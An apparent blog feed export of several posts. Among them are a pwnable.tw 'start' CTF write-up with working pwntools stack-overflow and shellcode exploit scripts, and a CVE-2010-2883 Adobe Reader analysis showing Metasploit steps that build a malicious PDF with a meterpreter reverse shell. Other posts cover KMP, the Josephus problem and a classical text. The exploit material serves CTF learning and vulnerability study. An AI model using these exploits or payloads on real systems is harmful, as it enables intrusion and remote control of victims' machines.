      <categories>
          
          <category> 技术分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup of pwnable.tw之start</title>
      <link href="/2020/03/20/Writeup-of-pwnable-tw%E4%B9%8Bstart/"/>
      <url>/2020/03/20/Writeup-of-pwnable-tw%E4%B9%8Bstart/</url>
      
        <content type="html"><![CDATA[<p>题目地址：pwable.tw</p><p>使用checksec查看开启了哪些防护措施：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>使用objdump -d进行反汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:54                   push   %esp</span><br><span class="line"> 8048061:68 9d 80 04 08       push   $0x804809d</span><br><span class="line"> 8048066:31 c0                xor    %eax,%eax</span><br><span class="line"> 8048068:31 db                xor    %ebx,%ebx</span><br><span class="line"> 804806a:31 c9                xor    %ecx,%ecx</span><br><span class="line"> 804806c:31 d2                xor    %edx,%edx</span><br><span class="line"> 804806e:68 43 54 46 3a       push   $0x3a465443</span><br><span class="line"> 8048073:68 74 68 65 20       push   $0x20656874</span><br><span class="line"> 8048078:68 61 72 74 20       push   $0x20747261</span><br><span class="line"> 804807d:68 73 20 73 74       push   $0x74732073</span><br><span class="line"> 8048082:68 4c 65 74 27       push   $0x2774654c &#x2F;&#x2F;将要显示的字符串压栈</span><br><span class="line"> 8048087:89 e1                mov    %esp,%ecx</span><br><span class="line"> 8048089:b2 14                mov    $0x14,%dl</span><br><span class="line"> 804808b:b3 01                mov    $0x1,%bl</span><br><span class="line"> 804808d:b0 04                mov    $0x4,%al</span><br><span class="line"> 804808f:cd 80                int    $0x80</span><br><span class="line"> 8048091:31 db                xor    %ebx,%ebx</span><br><span class="line"> 8048093:b2 3c                mov    $0x3c,%dl</span><br><span class="line"> 8048095:b0 03                mov    $0x3,%al</span><br><span class="line"> 8048097:cd 80                int    $0x80</span><br><span class="line"> 8048099:83 c4 14             add    $0x14,%esp</span><br><span class="line"> 804809c:c3                   ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:5c                   pop    %esp</span><br><span class="line"> 804809e:31 c0                xor    %eax,%eax</span><br><span class="line"> 80480a0:40                   inc    %eax</span><br><span class="line"> 80480a1:cd 80                int    $0x80</span><br></pre></td></tr></table></figure><p>可以看出程序的流程就是执行了write(1, esp_address, 0x14)；向控制台写入要显示的字符。</p><p>然后执行read(0, esp_address, 0x3c)；读入字符串。</p><p>可看出存在明显的栈溢出漏洞，且未开启任何防护措施。但是我们不知道栈地址，所以需要leak栈地址。通过最上边的一条反汇编：</p><p> 8048060:    54                       push   %esp</p><p>可以 ret 到0x8048087处将esp处的内容leak出来，此时的栈顶储存的时栈顶地址+4的地址值。</p><p>具体思路如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./start")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>)) <span class="comment">#返回到0x8048087处再执行write(1, esp_address, 0x14)</span></span><br><span class="line">s = p.recv(<span class="number">4</span>)  <span class="comment">#接收到esp的值</span></span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">'''mov al,0x03\n</span></span><br><span class="line"><span class="string">   sub esp,0x40\n</span></span><br><span class="line"><span class="string">   mov ecx,esp\n</span></span><br><span class="line"><span class="string">   mov dl,0x40\n</span></span><br><span class="line"><span class="string">   int 0x80\n</span></span><br><span class="line"><span class="string">   jmp esp'''</span>  <span class="comment">#直接跳到shellcode地址处</span></span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))<span class="comment">#由于题目内的read(),只能读0x3c个值，所以构造一个可以读取更多内容的shellcode。</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))<span class="comment">#读入shellcode，</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./start")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">20</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">s = p.recv(<span class="number">4</span>)</span><br><span class="line">address_esp = u32(s)</span><br><span class="line">ass=<span class="string">'''mov al,0x03\n</span></span><br><span class="line"><span class="string">   sub esp,0x40\n</span></span><br><span class="line"><span class="string">   mov ecx,esp\n</span></span><br><span class="line"><span class="string">   mov dl,0x40\n</span></span><br><span class="line"><span class="string">   int 0x80\n</span></span><br><span class="line"><span class="string">   ret'''</span></span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x14</span>+p32(address_esp+<span class="number">0x14</span>)+asm(ass))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.send(p32(address_esp+<span class="number">0x14</span>+<span class="number">0x04</span><span class="number">-0x40</span>)+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读《大学》</title>
      <link href="/2020/03/16/%E8%AF%BB%E3%80%8A%E5%A4%A7%E5%AD%A6%E3%80%8B/"/>
      <url>/2020/03/16/%E8%AF%BB%E3%80%8A%E5%A4%A7%E5%AD%A6%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>汤之《盘铭》曰：“苟日新，日日新，又日新。”《康诰》曰：“作新民。”《诗》曰：“周虽旧邦，其命维新。”是故君子无所不用其极。</p><p>每日更新自己，不间断。君子无处不追求最完善的境地。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模式匹配算法</title>
      <link href="/2020/03/16/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/"/>
      <url>/2020/03/16/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h6 id="一、朴素模式匹配算法"><a href="#一、朴素模式匹配算法" class="headerlink" title="一、朴素模式匹配算法"></a>一、朴素模式匹配算法</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回字串T在主串S中第pos个字符之后的位置。若不存在，则函数返回0；</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bf</span><span class="params">(<span class="built_in">string</span> S, <span class="built_in">string</span> T, <span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = pos;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> S_length = S.length();</span><br><span class="line"><span class="keyword">int</span> T_length = T.length();</span><br><span class="line"><span class="keyword">while</span> (i &lt; S_length &amp;&amp; j &lt; T_length) &#123;</span><br><span class="line"><span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">i = i - j + <span class="number">1</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T_length) &#123;</span><br><span class="line"><span class="keyword">return</span> i - T_length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="二、KMP模式匹配算法"><a href="#二、KMP模式匹配算法" class="headerlink" title="二、KMP模式匹配算法"></a>二、KMP模式匹配算法</h6><p>KMP(克努特-莫里斯-普拉特)</p><p>字串各个位的j值的变化定义为一个数组next:</p><p><img src="KMP.png" alt=""></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*通过计算返回字串T的next数组。*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_next</span><span class="params">(<span class="built_in">string</span> T, <span class="keyword">int</span> *next)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">1</span>, k=<span class="number">0</span>;</span><br><span class="line">next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; T.length()<span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">-1</span> || T[i] == T[k]) &#123;</span><br><span class="line">i++;</span><br><span class="line">k++;</span><br><span class="line">next[i] = k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">k = next[k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(<span class="built_in">string</span> S, <span class="built_in">string</span> T, <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = pos;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> next[<span class="number">255</span>];</span><br><span class="line">get_next(T, next);</span><br><span class="line"><span class="keyword">int</span> S_len = S.length();</span><br><span class="line"><span class="keyword">int</span> T_len = T.length();</span><br><span class="line"><span class="keyword">while</span> (i &lt; S_len &amp;&amp; j &lt; T_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (j == <span class="number">-1</span> || S[i] == T[j]) &#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">j = next[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T_len)</span><br><span class="line"><span class="keyword">return</span> i - T_len;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 模式匹配算法 </tag>
            
            <tag> 串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Josephus</title>
      <link href="/2020/03/16/Josephus/"/>
      <url>/2020/03/16/Josephus/</url>
      
        <content type="html"><![CDATA[<p>约瑟夫问题是个有名的问题：N个人围成一圈，从第一个开始报数，第M个将被杀掉，最后剩下一个，其余人都将被杀掉。例如N=6，M=5，被杀掉的顺序是：5，4，6，2，3，1。</p><p>代码实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Joseph</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>]; <span class="comment">//开局每个人的编号</span></span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;  <span class="comment">//记录第k个出局的人</span></span><br><span class="line"><span class="keyword">int</span> p = <span class="number">0</span>;  <span class="comment">//出局人的当前位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">a[i] = i + <span class="number">1</span>; <span class="comment">//编号初始化，</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//循环T人</span></span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">1</span>)&#123;</span><br><span class="line">p = (p + m - <span class="number">1</span>) % n; <span class="comment">//关键点，计算出圈人的位置</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"第"</span> &lt;&lt; ++k &lt;&lt; <span class="string">"个出圈的是："</span> &lt;&lt; a[p] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//重新排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = p + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">a[j - <span class="number">1</span>] = a[j]; </span><br><span class="line">        <span class="comment">//人数减一</span></span><br><span class="line">n--;</span><br><span class="line"><span class="keyword">if</span> (p == n) p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"最后剩下的是"</span> &lt;&lt; a[p] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> 约瑟夫问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</title>
      <link href="/2020/03/15/CVE-2010-2883/"/>
      <url>/2020/03/15/CVE-2010-2883/</url>
      
        <content type="html"><![CDATA[<h1 id="一、调试环境"><a href="#一、调试环境" class="headerlink" title="一、调试环境"></a>一、调试环境</h1><p>windows xp sp3中文版</p><p>Adobe Reader (9.3.4)</p><p>Ollydbg</p><p>IDA Pro</p><p>010editor</p><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><h2 id="1-样本构造"><a href="#1-样本构造" class="headerlink" title="1.样本构造"></a>1.样本构造</h2><p>使用msf生成样本并设置监听程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit&#x2F;windows&#x2F;browser&#x2F;adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; options                             Module options (exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing):           </span><br><span class="line">   Name      Current Setting  Required  Description                         </span><br><span class="line">   ----      ---------------  --------  -----------                    </span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.                                   </span><br><span class="line">   Exploit target:                                                               </span><br><span class="line">   Id  Name                                       </span><br><span class="line">   --  ----                                      </span><br><span class="line">   0   Automatic                                                   </span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp                                                  </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; options</span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.</span><br><span class="line">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">   **DisablePayloadHandler: True   (no handler will be created!)**</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST &#x3D;&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set filename msf4444.pdf</span><br><span class="line">filename &#x3D;&gt; msf4444.pdf</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; exploit </span><br><span class="line">[*] Creating &#39;msf4444.pdf&#39; file...</span><br><span class="line">[+] msf4444.pdf stored at &#x2F;home&#x2F;kali&#x2F;.msf4&#x2F;local&#x2F;msf4444.pdf</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; back</span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; options </span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;handler):</span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line">   </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST &#x3D;&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure><p>反弹shell成功：</p><p><img src="%E5%8F%8D%E5%BC%B9shell.png" alt=""></p><p><img src="%E5%8F%8D%E5%BC%B9shell2.png" alt=""></p><p>表明样本构造成功：</p><h2 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a>2.样本行为分析</h2><p>使用Process Monitor开启程序的监控，分析样本行为。这里我们主要检测其网络行为。我们发现其与192.168.110.142的地址通过4444端口进行tcp通信：</p><p><img src="%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90.png" alt=""></p><h2 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3.静态分析"></a>3.静态分析</h2><p>基于前人的探索，我们可以直接定位到漏洞位置；IDA Pro反汇编CoolType.dll库，搜索“SING”字符串，定位到下图位置：</p><p><img src="SING.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DCF9                 push    ebp</span><br><span class="line">.text:0803DCFA                 sub     esp, 104h       ; 分配栈空间0x104</span><br><span class="line">.text:0803DD00                 lea     ebp, [esp-4]    ; strcat的dest</span><br><span class="line">.text:0803DD04                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09                 xor     eax, ebp</span><br><span class="line">.text:0803DD0B                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11                 push    4Ch</span><br><span class="line">.text:0803DD13                 mov     eax, offset sub_8184A54</span><br><span class="line">.text:0803DD18                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35                 call    sub_804172C</span><br><span class="line">.text:0803DD3A                 xor     esi, esi</span><br><span class="line">.text:0803DD3C                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD40                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43                 jz      loc_803DF00</span><br><span class="line">.text:0803DD49                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57                 jnz     loc_803DEA9</span><br><span class="line">.text:0803DD5D                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62                 push    edi             ; int</span><br><span class="line">.text:0803DD63                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A                 call    sub_80217D7</span><br><span class="line">.text:0803DD6F                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72                 jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C] ; SING表的入口地址</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C] ; 